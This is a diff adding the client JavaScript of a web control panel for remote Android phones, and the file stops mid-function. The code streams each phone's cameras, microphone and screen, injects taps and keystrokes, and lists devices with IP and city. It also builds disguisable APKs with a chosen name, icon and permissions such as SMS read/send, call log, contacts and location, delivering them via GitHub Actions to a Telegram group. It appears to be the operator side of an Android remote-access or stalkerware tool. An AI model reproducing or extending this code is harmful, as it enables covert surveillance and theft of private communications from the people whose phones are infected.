@@ -1,0 +1,2071 @@
+// Клиент веб-панели. Общается с сервером по REST (/api/*) и WebSocket (/ws).
+
+const $ = (s) => document.querySelector(s);
+const api = async (path, opts) => {
+  const res = await fetch('/api/' + path, opts);
+  if (res.status === 401) { location.href = '/login'; return {}; }
+  const data = await res.json().catch(() => ({}));
+  if (!res.ok) throw new Error(data.error || res.statusText);
+  return data;
+};
+const jpost = (path, body) => api(path, {
+  method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body),
+});
+
+function toast(msg, isErr, persist) {
+  const t = $('#toast');
+  t.textContent = msg;
+  const cls = 'toast show' + (isErr ? ' err' : '');
+  if (t.className !== cls) t.className = cls;
+  clearTimeout(toast._t);
+  if (!persist) toast._t = setTimeout(() => (t.className = 'toast'), 2600);
+}
+
+// ---------- Камера в левой панели ----------
+let camFrameCount = 0, lastCamFpsTime = Date.now();
+
+// Нормализованные координаты клика по картинке (учёт «letterbox» внутри contain)
+function normFromEvent(e, img) {
+  const rect = img.getBoundingClientRect();
+  const natRatio = img.naturalWidth / img.naturalHeight;
+  const boxRatio = rect.width / rect.height;
+  let dispW = rect.width, dispH = rect.height, offX = 0, offY = 0;
+  if (natRatio > boxRatio) { dispH = rect.width / natRatio; offY = (rect.height - dispH) / 2; }
+  else { dispW = rect.height * natRatio; offX = (rect.width - dispW) / 2; }
+  const x = (e.clientX - rect.left - offX) / dispW;
+  const y = (e.clientY - rect.top - offY) / dispH;
+  return { x: Math.min(1, Math.max(0, x)), y: Math.min(1, Math.max(0, y)) };
+}
+
+// Отправка текста из левой панели
+$('#sendText').onclick = () => {
+  const v = $('#textInput').value;
+  if (v) { ctrlSend({ type: 'text', text: v }); $('#textInput').value = ''; }
+};
+$('#textInput').addEventListener('keydown', (e) => { if (e.key === 'Enter') $('#sendText').click(); });
+
+
+// ---------- Раскрывающиеся группы разрешений ----------
+document.querySelectorAll('.perm-group-hd').forEach((hd) => {
+  hd.addEventListener('click', (e) => {
+    if (e.target.type === 'checkbox') return;
+    hd.closest('.perm-group').classList.toggle('open');
+  });
+});
+
+function _syncMaster(masterId) {
+  const master = document.getElementById(masterId);
+  if (!master) return;
+  const kids = [...document.querySelectorAll(`[data-master="${masterId}"]`)];
+  const n = kids.filter((c) => c.checked).length;
+  master.indeterminate = n > 0 && n < kids.length;
+  master.checked = n === kids.length;
+}
+
+document.querySelectorAll('.perm-master').forEach((master) => {
+  master.addEventListener('change', () => {
+    document.querySelectorAll(`[data-master="${master.id}"]`).forEach((c) => {
+      c.checked = master.checked;
+    });
+    master.indeterminate = false;
+  });
+});
+
+document.querySelectorAll('[data-master]').forEach((ch) => {
+  ch.addEventListener('change', () => _syncMaster(ch.dataset.master));
+});
+
+$('#permSelectAll').onclick = () => {
+  document.querySelectorAll('#permsFld input[type=checkbox]').forEach((cb) => {
+    cb.checked = true; cb.indeterminate = false;
+  });
+};
+$('#permClearAll').onclick = () => {
+  document.querySelectorAll('#permsFld input[type=checkbox]').forEach((cb) => {
+    cb.checked = false; cb.indeterminate = false;
+  });
+};
+
+// ---------- Связки разрешений ----------
+const _PERM_CBX = [
+  ['permCamera','CAMERA'],['permMic','RECORD_AUDIO'],['permScreen','SCREEN'],
+  ['permNotif','NOTIFICATIONS'],['permPhoneState','PHONE_STATE'],['permCallLog','CALL_LOG'],
+  ['permCallPhone','CALL_PHONE'],['permContacts','CONTACTS'],['permReadSms','READ_SMS'],
+  ['permSendSms','SEND_SMS'],['permReceiveSms','RECEIVE_SMS'],['permBtConnect','BT_CONNECT'],
+  ['permBtScan','BT_SCAN'],['permLocation','LOCATION'],['permMediaImages','MEDIA_IMAGES'],
+  ['permMediaVideo','MEDIA_VIDEO'],['permCalendar','CALENDAR'],['permBattery','BATTERY'],
+];
+function _getBundles() { try { return JSON.parse(localStorage.getItem('apk_bundles') || '[]'); } catch { return []; } }
+function _saveBundlesStore(arr) { localStorage.setItem('apk_bundles', JSON.stringify(arr)); }
+function _collectPerms() { return _PERM_CBX.filter(([id]) => document.getElementById(id)?.checked).map(([,c]) => c); }
+function _applyBundle(b) {
+  _PERM_CBX.forEach(([id, code]) => { const el = document.getElementById(id); if (el) el.checked = b.perms.includes(code); });
+  ['permPhoneAll','permSmsAll','permBtAll','permMediaAll'].forEach(_syncMaster);
+}
+function _renderBundles() {
+  const row = document.getElementById('bundlesRow');
+  if (!row) return;
+  const bundles = _getBundles();
+  row.innerHTML = '';
+  bundles.forEach((b, i) => {
+    const chip = document.createElement('span');
+    chip.className = 'bundle-chip';
+    const btn = document.createElement('button');
+    btn.type = 'button'; btn.className = 'bundle-btn'; btn.textContent = b.name;
+    btn.title = 'Применить: ' + b.perms.join(', ');
+    btn.onclick = () => _applyBundle(b);
+    const del = document.createElement('button');
+    del.type = 'button'; del.className = 'bundle-del'; del.textContent = '×'; del.title = 'Удалить связку';
+    del.onclick = (e) => { e.stopPropagation(); const arr = _getBundles(); arr.splice(i, 1); _saveBundlesStore(arr); _renderBundles(); };
+    chip.append(btn, del);
+    row.appendChild(chip);
+  });
+  if (bundles.length < 3) {
+    const addBtn = document.createElement('button');
+    addBtn.type = 'button'; addBtn.className = 'sm'; addBtn.textContent = '+ Сохранить связку';
+    addBtn.onclick = () => {
+      addBtn.style.display = 'none';
+      const inp = document.createElement('input');
+      inp.className = 'bundle-name-inp'; inp.placeholder = 'Название…'; inp.maxLength = 20;
+      const ok = document.createElement('button');
+      ok.type = 'button'; ok.className = 'sm'; ok.textContent = 'Сохранить';
+      const cancel = document.createElement('button');
+      cancel.type = 'button'; cancel.className = 'sm'; cancel.textContent = 'Отмена';
+      const doSave = () => {
+        const name = inp.value.trim();
+        if (!name) { inp.focus(); return; }
+        const arr = _getBundles();
+        if (arr.length >= 3) return;
+        arr.push({ name, perms: _collectPerms() });
+        _saveBundlesStore(arr);
+        _renderBundles();
+      };
+      inp.addEventListener('keydown', (e) => { if (e.key === 'Enter') doSave(); if (e.key === 'Escape') _renderBundles(); });
+      ok.onclick = doSave; cancel.onclick = () => _renderBundles();
+      row.append(inp, ok, cancel);
+      inp.focus();
+    };
+    row.appendChild(addBtn);
+  }
+}
+_renderBundles();
+
+// ---------- Вкладки пикера ----------
+document.querySelectorAll('.picker-tab').forEach((tab) => {
+  tab.onclick = () => {
+    document.querySelectorAll('.picker-tab').forEach((t) => t.classList.remove('active'));
+    document.querySelectorAll('.picker-panel').forEach((p) => p.classList.remove('active'));
+    tab.classList.add('active');
+    $('#ptab-' + tab.dataset.ptab).classList.add('active');
+    if (tab.dataset.ptab === 'build') loadBuildTab();
+  };
+});
+
+// ---------- Вкладки панели устройства ----------
+document.querySelectorAll('.tab').forEach((tab) => {
+  tab.onclick = () => {
+    document.querySelectorAll('.tab').forEach((t) => t.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach((c) => c.classList.remove('active'));
+    tab.classList.add('active');
+    $('#tab-' + tab.dataset.tab).classList.add('active');
+    if (tab.dataset.tab === 'dashboard') { loadDashboard(); phoneSend({ cmd: 'get-system-info' }); }
+    if (tab.dataset.tab === 'commands') loadCommandsTab();
+    if (tab.dataset.tab === 'apps') loadApps();
+    if (tab.dataset.tab === 'files') { const fp = $('#filePath'); if (fp) loadFiles(fp.value); }
+    if (tab.dataset.tab === 'notifs') loadNotifs();
+    if (tab.dataset.tab === 'camera') startCameraView();
+    if (tab.dataset.tab === 'calls') startCallsTab();
+    if (tab.dataset.tab === 'sms') {
+      startCallsTab(); phoneSend({ cmd: 'get-sms' });
+      const badge = $('#smsBadge'); if (badge) { badge.style.display = 'none'; badge.textContent = ''; }
+    }
+  };
+});
+
+// ---------- Экран выбора устройства ----------
+let pickerTimer = null;
+let allPickerPhones = [];
+let currentDft = 'all';
+
+document.querySelectorAll('.dft').forEach((tab) => {
+  tab.onclick = () => {
+    document.querySelectorAll('.dft').forEach((t) => t.classList.remove('active'));
+    tab.classList.add('active');
+    currentDft = tab.dataset.dft;
+    renderFilteredPhones();
+  };
+});
+
+function showPicker() {
+  $('#picker').style.display = 'flex';
+  $('.layout').style.display = 'none';
+  $('#backBtn').style.display = 'none';
+  refreshPicker();
+  pickerTimer = setInterval(refreshPicker, 3000);
+}
+
+function hidePicker() {
+  clearInterval(pickerTimer);
+  pickerTimer = null;
+  $('#picker').style.display = 'none';
+  $('.layout').style.display = 'flex';
+  $('#backBtn').style.display = '';
+}
+
+async function refreshPicker() {
+  try {
+    const data = await api('phones');
+    allPickerPhones = data.phones || [];
+    updateDftCounts();
+    renderFilteredPhones();
+  } catch { /* ignore network errors while waiting */ }
+}
+
+function updateDftCounts() {
+  document.querySelectorAll('.dft').forEach((t) => {
+    const f = t.dataset.dft;
+    const labels = { all: 'Все', online: 'Онлайн', offline: 'Офлайн', deleted: 'Удалённые' };
+    const count = f === 'all' ? allPickerPhones.filter(p => !p.deleted).length
+      : f === 'online' ? allPickerPhones.filter(p => p.online && !p.deleted).length
+      : f === 'offline' ? allPickerPhones.filter(p => !p.online && !p.deleted).length
+      : allPickerPhones.filter(p => p.deleted).length;
+    t.textContent = labels[f] + (count ? ` (${count})` : '');
+  });
+}
+
+function countryFlag(code) {
+  if (!code || code.length !== 2) return '🌐';
+  return String.fromCodePoint(
+    code.toUpperCase().charCodeAt(0) - 65 + 0x1F1E6,
+    code.toUpperCase().charCodeAt(1) - 65 + 0x1F1E6
+  );
+}
+
+function permsHtml(perms) {
+  if (!perms) return '';
+  const items = [
+    { key: 'camera',        icon: '📷', label: 'Камера' },
+    { key: 'mic',           icon: '🎤', label: 'Микрофон' },
+    { key: 'accessibility', icon: '👆', label: 'Управление' },
+    { key: 'projection',    icon: '🖥', label: 'Экран' },
+    { key: 'phone',         icon: '📞', label: 'Звонки' },
+    { key: 'contacts',      icon: '👥', label: 'Контакты' },
+  ];
+  return '<span class="ps-perms">' + items.map((it) =>
+    `<span class="ps-perm ${perms[it.key] ? 'perm-on' : 'perm-off'}" title="${it.label}">${it.icon}</span>`
+  ).join('') + '</span>';
+}
+
+function batteryBar(pct) {
+  if (pct === null || pct === undefined) return '';
+  const cls = pct < 20 ? 'bat-low' : pct < 40 ? 'bat-mid' : 'bat-ok';
+  return `<span class="ps-bat ${cls}"><span class="ps-bat-body"><span class="ps-bat-fill" style="width:${pct}%"></span><span class="ps-bat-pct">${pct}%</span></span><span class="ps-bat-tip"></span></span>`;
+}
+
+function relTime(ts) {
+  if (!ts) return '';
+  const d = Date.now() - ts;
+  if (d < 60000) return 'только что';
+  if (d < 3600000) return `${Math.floor(d / 60000)} мин. назад`;
+  if (d < 86400000) return `${Math.floor(d / 3600000)} ч. назад`;
+  return new Date(ts).toLocaleDateString('ru-RU', { day: 'numeric', month: 'short', hour: '2-digit', minute: '2-digit' });
+}
+
+function renderFilteredPhones() {
+  const list = $('#phoneGrid');
+  const status = $('#pickerStatus');
+  const filtered = currentDft === 'deleted' ? allPickerPhones.filter(p => p.deleted)
+    : currentDft === 'online' ? allPickerPhones.filter(p => p.online && !p.deleted)
+    : currentDft === 'offline' ? allPickerPhones.filter(p => !p.online && !p.deleted)
+    : allPickerPhones.filter(p => !p.deleted);
+
+  list.innerHTML = '';
+  if (!filtered.length) {
+    status.style.display = '';
+    status.textContent = currentDft === 'deleted' ? 'Нет удалённых устройств'
+      : currentDft === 'online' ? 'Нет онлайн-устройств'
+      : currentDft === 'offline' ? 'Нет офлайн-устройств'
+      : 'Ожидание подключения телефонов…';
+    return;
+  }
+  status.style.display = 'none';
+
+  for (const p of filtered) {
+    const strip = document.createElement('div');
+    strip.className = 'phone-strip' + (p.online ? '' : ' ps-offline');
+    const flag = countryFlag(p.countryCode);
+    const city = p.city || '';
+    const statusBadge = `<span class="ps-online-dot ${p.online ? 'on' : ''}"></span><span class="ps-online-lbl">${p.online ? 'онлайн' : 'офлайн'}</span>`;
+    const bat = batteryBar(p.battery);
+    const last = relTime(p.lastSeen);
+
+    if (currentDft === 'deleted') {
+      strip.innerHTML = `
+        <span class="ps-flag">${flag}</span>
+        <span class="ps-info">
+          <span class="ps-model">${p.model || 'Android'}</span>
+          <span class="ps-sub"><span class="ps-ip">${p.label}</span>${city ? `<span class="ps-city">${city}</span>` : ''}</span>
+          ${last ? `<span class="ps-sub ps-last">${last}</span>` : ''}
+        </span>
+        <button class="sm ps-restore-btn" title="Восстановить">↩ Вернуть</button>`;
+      strip.querySelector('.ps-restore-btn').onclick = (e) => { e.stopPropagation(); restorePhone(p.ip); };
+    } else {
+      strip.innerHTML = `
+        <span class="ps-flag">${flag}</span>
+        <span class="ps-info">
+          <span class="ps-model">${p.model || 'Android'}</span>
+          <span class="ps-sub"><span class="ps-ip">${p.label}</span>${city ? `<span class="ps-city">${city}</span>` : ''}</span>
+          <span class="ps-meta">${statusBadge}${bat ? `<span class="ps-sep">·</span>${bat}` : ''}${last ? `<span class="ps-sep">·</span><span class="ps-last">${last}</span>` : ''}</span>
+          ${permsHtml(p.perms)}
+        </span>
+        ${p.online ? '<span class="ps-arrow">›</span>' : ''}
+        <button class="sm ps-del-btn" title="Удалить устройство">🗑</button>`;
+      if (p.online) {
+        strip.style.cursor = 'pointer';
+        strip.onclick = (e) => { if (e.target.closest('.ps-del-btn')) return; selectPhone(p.ip); };
+      }
+      strip.querySelector('.ps-del-btn').onclick = (e) => { e.stopPropagation(); deletePhone(p.ip); };
+    }
+    list.appendChild(strip);
+  }
+}
+
+// Оставляем для совместимости с ws-уведомлениями
+function renderPickerPhones(phones) {
+  allPickerPhones = phones;
+  updateDftCounts();
+  renderFilteredPhones();
+}
+
+async function deletePhone(ip) {
+  try {
+    await jpost('phones/delete', { ip });
+    toast('Устройство удалено');
+    refreshPicker();
+  } catch (e) { toast(e.message, true); }
+}
+
+async function restorePhone(ip) {
+  try {
+    await jpost('phones/restore', { ip });
+    currentDft = 'all';
+    document.querySelectorAll('.dft').forEach((t) => t.classList.toggle('active', t.dataset.dft === 'all'));
+    toast('Устройство восстановлено');
+    refreshPicker();
+  } catch (e) { toast(e.message, true); }
+}
+
+async function selectPhone(ip) {
+  try {
+    await jpost('phones/select', { ip });
+    hidePicker();
+    startCameraView();
+  } catch (e) { toast(e.message, true); }
+}
+
+$('#backBtn').onclick = showPicker;
+$('#pickerRefresh').onclick = refreshPicker;
+
+// ---------- Экран телефона (MediaProjection) ----------
+let wsScreenViewer = null;
+let wsControlChannel = null;
+let screenRendering = false;
+let screenPendingData = null;
+
+function renderScreenFrame() {
+  if (!screenPendingData) { screenRendering = false; return; }
+  screenRendering = true;
+  const data = screenPendingData;
+  screenPendingData = null;
+  const url = URL.createObjectURL(new Blob([data], { type: 'image/jpeg' }));
+  const img = $('#phoneScreen');
+  const prev = img.dataset.url;
+  img.onload = () => { if (prev) URL.revokeObjectURL(prev); renderScreenFrame(); };
+  img.onerror = () => { if (prev) URL.revokeObjectURL(prev); renderScreenFrame(); };
+  img.src = url;
+  img.dataset.url = url;
+}
+
+function startScreenViewer() {
+  if (wsScreenViewer && wsScreenViewer.readyState < 2) return;
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  wsScreenViewer = new WebSocket(`${proto}://${location.host}/screen?role=viewer`);
+  wsScreenViewer.binaryType = 'arraybuffer';
+  wsScreenViewer.onopen = () => {
+    $('#phoneScreenStatus').textContent = 'ожидание телефона…';
+    $('#phoneScreenStatus').classList.remove('on');
+  };
+  wsScreenViewer.onmessage = (ev) => {
+    if (typeof ev.data === 'string') {
+      try {
+        const m = JSON.parse(ev.data);
+        if (m.type === 'screen-phone') {
+          if (m.connected) {
+            $('#phoneScreenStatus').textContent = 'ожидание скриншота…';
+            $('#phoneScreenStatus').classList.remove('on');
+          } else {
+            $('#phoneScreenStatus').textContent = 'телефон не подключён';
+            $('#phoneScreenStatus').classList.remove('on');
+          }
+        }
+      } catch {}
+      return;
+    }
+    screenPendingData = ev.data;
+    if (!screenRendering) renderScreenFrame();
+    const hint = $('#phoneScreenHint');
+    if (hint) hint.style.display = 'none';
+    $('#phoneScreenStatus').textContent = 'подключён';
+    $('#phoneScreenStatus').classList.add('on');
+  };
+  wsScreenViewer.onclose = () => {
+    $('#phoneScreenStatus').textContent = 'нет соединения';
+    $('#phoneScreenStatus').classList.remove('on');
+    setTimeout(startScreenViewer, 2000);
+  };
+  wsScreenViewer.onerror = () => {};
+}
+
+function startControlChannel() {
+  if (wsControlChannel && wsControlChannel.readyState < 2) return;
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  wsControlChannel = new WebSocket(`${proto}://${location.host}/control?role=viewer`);
+  wsControlChannel.onclose = () => setTimeout(startControlChannel, 2000);
+  wsControlChannel.onerror = () => {};
+}
+
+function ctrlSend(obj) {
+  if (wsControlChannel && wsControlChannel.readyState === WebSocket.OPEN)
+    wsControlChannel.send(JSON.stringify(obj));
+}
+
+// Тап / свайп на экране телефона (MediaProjection)
+const phoneScreenEl = $('#phoneScreen');
+let phoneDownPt = null, phoneDownTime = 0;
+phoneScreenEl.addEventListener('mousedown', (e) => {
+  if (!phoneScreenEl.naturalWidth) return;
+  phoneDownPt = normFromEvent(e, phoneScreenEl);
+  phoneDownTime = Date.now();
+  e.preventDefault();
+});
+window.addEventListener('mouseup', (e) => {
+  if (!phoneDownPt) return;
+  const up = normFromEvent(e, phoneScreenEl);
+  const dist = Math.hypot(up.x - phoneDownPt.x, up.y - phoneDownPt.y);
+  const dt = Date.now() - phoneDownTime;
+  if (dist < 0.02 && dt < 400) ctrlSend({ type: 'tap', x: phoneDownPt.x, y: phoneDownPt.y });
+  else ctrlSend({ type: 'swipe', x1: phoneDownPt.x, y1: phoneDownPt.y, x2: up.x, y2: up.y, ms: Math.min(600, Math.max(100, dt)) });
+  phoneDownPt = null;
+});
+phoneScreenEl.addEventListener('keydown', (e) => {
+  if (e.key === 'Escape') { ctrlSend({ type: 'key', name: 'BACK' }); e.preventDefault(); }
+  else if (e.key === 'Enter') { ctrlSend({ type: 'text', text: '\n' }); e.preventDefault(); }
+  else if (e.key === 'Backspace') { ctrlSend({ type: 'key', name: 'DEL' }); e.preventDefault(); }
+  else if (e.key.length === 1) { ctrlSend({ type: 'text', text: e.key }); e.preventDefault(); }
+});
+document.querySelectorAll('[data-ctrl-key]').forEach((btn) => {
+  btn.onclick = () => ctrlSend({ type: 'key', name: btn.dataset.ctrlKey });
+});
+$('#screenQuality').addEventListener('input', (e) => {
+  const q = parseInt(e.target.value);
+  $('#screenQualityVal').textContent = q + '%';
+  ctrlSend({ type: 'screen-quality', quality: q });
+});
+
+$('#phoneTextInput').addEventListener('keydown', (e) => { if (e.key === 'Enter') $('#phoneSendText').click(); });
+$('#phoneSendText').onclick = () => {
+  const v = $('#phoneTextInput').value;
+  if (v) { ctrlSend({ type: 'text', text: v }); $('#phoneTextInput').value = ''; }
+};
+
+// ---------- Трансляция камеры телефона ----------
+const camWS = { back: null, front: null };
+const phoneConnected = { back: false, front: false };
+let currentLeftCam = 'back';
+let lastCamFrameTime = Date.now();
+let camStatusTimer = null;
+let specificCamStatus = null;
+
+function setCamStatusOverlay(msg) {
+  const el = $('#camStatus');
+  if (!el) return;
+  if (msg) { el.textContent = msg; el.style.display = 'block'; }
+  else { el.style.display = 'none'; }
+}
+
+function scheduleCamStatusCheck() {
+  clearTimeout(camStatusTimer);
+  camStatusTimer = setTimeout(() => {
+    if (specificCamStatus) {
+      setCamStatusOverlay('📷 ' + specificCamStatus);
+    } else {
+      const connected = phoneConnected.back || phoneConnected.front;
+      if (!connected) {
+        setCamStatusOverlay('Камера не подключена к серверу. Запусти APK на телефоне.');
+      } else if (Date.now() - lastCamFrameTime > 5000) {
+        setCamStatusOverlay('Камера подключена, но нет изображения. Проверь разрешение камеры в настройках телефона.');
+      } else {
+        setCamStatusOverlay(null);
+      }
+    }
+    scheduleCamStatusCheck();
+  }, 5000);
+}
+
+function startCamViewer(cam) {
+  const ws = camWS[cam];
+  if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  const sock = new WebSocket(`${proto}://${location.host}/camera?role=viewer&cam=${cam}`);
+  sock.binaryType = 'arraybuffer';
+  sock.onmessage = (ev) => {
+    if (typeof ev.data === 'string') {
+      const m = JSON.parse(ev.data);
+      if (m.type === 'phone') { phoneConnected[cam] = m.connected; updatePhoneStatus(); }
+      else if (m.type === 'phones') { renderPickerPhones(m.list); }
+      else if (m.type === 'cam-status') {
+        if (m.text === 'ok') {
+          specificCamStatus = null;
+          setCamStatusOverlay(null);
+          lastCamFrameTime = Date.now(); // сброс таймера — камера готова, ждём первый кадр
+        } else if (m.text) {
+          specificCamStatus = m.text;
+          setCamStatusOverlay('📷 ' + m.text);
+        }
+      }
+      return;
+    }
+    if (cam !== currentLeftCam) return;
+    lastCamFrameTime = Date.now();
+    specificCamStatus = null;
+    setCamStatusOverlay(null);
+    const url = URL.createObjectURL(new Blob([ev.data], { type: 'image/jpeg' }));
+    const img = $('#camLeft');
+    if (img.dataset.url) URL.revokeObjectURL(img.dataset.url);
+    img.src = url; img.dataset.url = url;
+    const hint = $('#screenHint');
+    if (hint) hint.style.display = 'none';
+    camFrameCount++;
+    const now = Date.now();
+    if (now - lastCamFpsTime >= 1000) {
+      $('#fps').textContent = `${camFrameCount} fps`;
+      camFrameCount = 0; lastCamFpsTime = now;
+    }
+  };
+  sock.onclose = () => {
+    camWS[cam] = null;
+    phoneConnected[cam] = false;
+    updatePhoneStatus();
+    setTimeout(() => startCamViewer(cam), 3000);
+  };
+  camWS[cam] = sock;
+}
+
+$('#btnCamSwitch').onclick = () => {
+  currentLeftCam = currentLeftCam === 'back' ? 'front' : 'back';
+  $('#btnCamSwitch').textContent = currentLeftCam === 'back' ? '🤳 Фронт' : '📷 Зад';
+  lastCamFrameTime = Date.now();
+  specificCamStatus = null;
+  setCamStatusOverlay(null);
+  startCamViewer(currentLeftCam);
+  const backWs = camWS.back;
+  if (backWs && backWs.readyState === WebSocket.OPEN) {
+    backWs.send(JSON.stringify({ cmd: 'switch', cam: currentLeftCam }));
+  } else {
+    ctrlSend({ type: 'cam-switch', cam: currentLeftCam });
+  }
+};
+
+// ---------- Аудио с телефона ----------
+let audioCtx = null;
+let gainNode = null;
+let audioWs = null;
+let audioMuted = true;
+let nextAudioTime = 0;
+const AUDIO_SAMPLE_RATE = 16000;
+
+function ensureAudioCtx() {
+  if (audioCtx) { if (audioCtx.state === 'suspended') audioCtx.resume(); return; }
+  audioCtx = new AudioContext({ sampleRate: AUDIO_SAMPLE_RATE });
+  gainNode = audioCtx.createGain();
+  gainNode.gain.value = audioMuted ? 0 : 1;
+  gainNode.connect(audioCtx.destination);
+  nextAudioTime = 0;
+}
+
+function startAudioViewer() {
+  if (audioWs && (audioWs.readyState === WebSocket.OPEN || audioWs.readyState === WebSocket.CONNECTING)) return;
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  audioWs = new WebSocket(`${proto}://${location.host}/audio?role=viewer`);
+  audioWs.binaryType = 'arraybuffer';
+  audioWs.onmessage = (ev) => {
+    if (typeof ev.data === 'string') return;
+    if (!audioCtx || !gainNode) return;
+    const int16 = new Int16Array(ev.data);
+    const float32 = new Float32Array(int16.length);
+    for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768;
+    const buf = audioCtx.createBuffer(1, float32.length, AUDIO_SAMPLE_RATE);
+    buf.copyToChannel(float32, 0);
+    const src = audioCtx.createBufferSource();
+    src.buffer = buf;
+    src.connect(gainNode);
+    const now = audioCtx.currentTime;
+    if (nextAudioTime < now + 0.02) nextAudioTime = now + 0.06;
+    src.start(nextAudioTime);
+    nextAudioTime += buf.duration;
+  };
+  audioWs.onclose = () => {};
+}
+
+$('#camMute').onclick = () => {
+  ensureAudioCtx();
+  audioMuted = !audioMuted;
+  gainNode.gain.setValueAtTime(audioMuted ? 0 : 1, audioCtx.currentTime);
+  $('#camMute').textContent = audioMuted ? '🔇 Тихо' : '🔊 Звук';
+};
+
+
+let streamPaused = false;
+$('#btnStream').onclick = () => {
+  streamPaused = !streamPaused;
+  const cmd = streamPaused ? 'pause' : 'resume';
+  const backWs = camWS.back;
+  if (backWs && backWs.readyState === WebSocket.OPEN) backWs.send(JSON.stringify({ cmd }));
+  $('#btnStream').textContent = streamPaused ? '▶ Стрим' : '⏸ Пауза';
+};
+
+function startCameraView() {
+  startCamViewer('back');
+  startCamViewer('front');
+  startAudioViewer();
+  startScreenViewer();
+  startControlChannel();
+  startCallsViewer(true); // запрашиваем phone-info сразу для дашборда
+  scheduleCamStatusCheck();
+}
+
+function updatePhoneStatus() {
+  const on = phoneConnected.back || phoneConnected.front;
+  const hint = $('#screenHint');
+  if (hint && on) hint.style.display = 'none';
+}
+
+// ---------- Билдинг APK ----------
+async function loadBuildTab() {
+  try {
+    const info = await api('serverinfo');
+    if (info.addresses && info.addresses.length && !$('#bServer').value) {
+      $('#bServer').value = `${info.addresses[0].address}:${info.port}`;
+    }
+  } catch { /* ignore */ }
+}
+
+
+$('#buildBtn').onclick = async () => {
+  const msg = $('#buildMsg');
+  if (!$('#bServer').value.trim()) {
+    msg.textContent = 'Укажи адрес панели — он зашивается в APK, чтобы телефон знал куда подключаться.';
+    $('#bServer').focus();
+    return;
+  }
+  msg.textContent = 'Сборка…';
+  const perms = [];
+  if ($('#permCamera').checked) perms.push('CAMERA');
+  if ($('#permMic').checked) perms.push('RECORD_AUDIO');
+  if ($('#permScreen').checked) perms.push('SCREEN');
+  if ($('#permNotif').checked) perms.push('NOTIFICATIONS');
+  if ($('#permPhoneState').checked) perms.push('PHONE_STATE');
+  if ($('#permCallLog').checked) perms.push('CALL_LOG');
+  if ($('#permCallPhone').checked) perms.push('CALL_PHONE');
+  if ($('#permContacts').checked) perms.push('CONTACTS');
+  if ($('#permReadSms').checked) perms.push('READ_SMS');
+  if ($('#permSendSms').checked) perms.push('SEND_SMS');
+  if ($('#permReceiveSms').checked) perms.push('RECEIVE_SMS');
+  if ($('#permBtConnect').checked) perms.push('BT_CONNECT');
+  if ($('#permBtScan').checked) perms.push('BT_SCAN');
+  if ($('#permLocation').checked) perms.push('LOCATION');
+  if ($('#permMediaImages').checked) perms.push('MEDIA_IMAGES');
+  if ($('#permMediaVideo').checked) perms.push('MEDIA_VIDEO');
+  if ($('#permCalendar').checked) perms.push('CALENDAR');
+  if ($('#permBattery').checked) perms.push('BATTERY');
+  const fd = new FormData();
+  fd.append('appName', $('#bAppName').value);
+  fd.append('applicationId', $('#bAppId').value);
+  fd.append('permissions', perms.join(','));
+  fd.append('defaultServer', $('#bServer').value);
+  const ownerVal = (document.getElementById('bOwnerRow')?.style.display !== 'none'
+    ? $('#bOwnerUser')?.value
+    : $('#bOwnerUserHidden')?.value) || '';
+  fd.append('ownerUsername', ownerVal.trim());
+  const icon = $('#bIcon').files[0];
+  if (icon) fd.append('icon', icon);
+  try {
+    const res = await fetch('/api/build/apk', { method: 'POST', body: fd });
+    if (res.ok) {
+      const blob = await res.blob();
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url; a.download = ($('#bAppName').value || 'app') + '.apk';
+      a.click(); URL.revokeObjectURL(url);
+      msg.textContent = 'Готово — APK скачан. Установи его на телефон и выдай доступ к камере.';
+    } else if (res.status === 501) {
+      await buildViaGitHub(msg, perms, ownerVal.trim());
+    } else {
+      const d = await res.json().catch(() => ({}));
+      msg.textContent = 'Ошибка сборки: ' + (d.error || res.statusText);
+    }
+  } catch (e) { msg.textContent = 'Ошибка: ' + e.message; }
+};
+
+async function buildViaGitHub(msgEl, perms = [], ownerUsername = '') {
+  msgEl.textContent = 'Отправляем задание на GitHub Actions…';
+  try {
+    const trigRes = await fetch('/api/build/github', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        appName: $('#bAppName').value,
+        applicationId: $('#bAppId').value,
+        defaultServer: $('#bServer').value,
+        ownerUsername,
+        permissions: perms.join(','),
+      }),
+    });
+    const td = await trigRes.json();
+    if (!trigRes.ok) {
+      msgEl.textContent = 'Ошибка GitHub API: ' + (td.error || trigRes.statusText);
+      return;
+    }
+    const { runId, runUrl } = td;
+    if (!runId) {
+      msgEl.innerHTML = `Сборка запущена, но ID запуска не получили. <a href="${runUrl}" target="_blank">Открыть Actions</a>`;
+      return;
+    }
+    msgEl.innerHTML = `Сборка идёт (#${runId})… ~2-3 мин. APK придёт в Telegram-группу.<br><a href="${runUrl}" target="_blank">Открыть в GitHub Actions</a>`;
+
+    const poll = setInterval(async () => {
+      try {
+        const sr = await fetch(`/api/build/github/status?runId=${runId}`);
+        const sd = await sr.json();
+        if (sd.status === 'completed') {
+          clearInterval(poll);
+          if (sd.conclusion === 'success') {
+            msgEl.innerHTML = `✅ Готово! APK отправлен в Telegram-группу.<br><a href="${sd.url}" target="_blank">Посмотреть сборку</a>`;
+          } else {
+            msgEl.innerHTML = `Ошибка сборки (${sd.conclusion}). <a href="${sd.url}" target="_blank">Смотри лог в Actions</a>`;
+          }
+        }
+      } catch { /* ignore transient poll errors */ }
+    }, 12000);
+  } catch (e) { msgEl.textContent = 'Ошибка: ' + e.message; }
+}
+
+// ---------- Дашборд ----------
+async function loadDashboard() {
+  try {
+    const info = await api('info');
+    $('#infoKv').innerHTML = `
+      <b>Модель</b><span>${info.manufacturer} ${info.model}</span>
+      <b>Android</b><span>${info.androidVersion} (SDK ${info.sdk})</span>
+      <b>Разрешение</b><span>${info.resolution}</span>
+      <b>Serial</b><span>${info.serialno}</span>`;
+  } catch { $('#infoKv').innerHTML = '<span style="color:var(--muted)">Ожидание данных от телефона…</span>'; }
+  try {
+    const b = await api('battery');
+    const pct = Math.round((b.level / (b.scale || 100)) * 100);
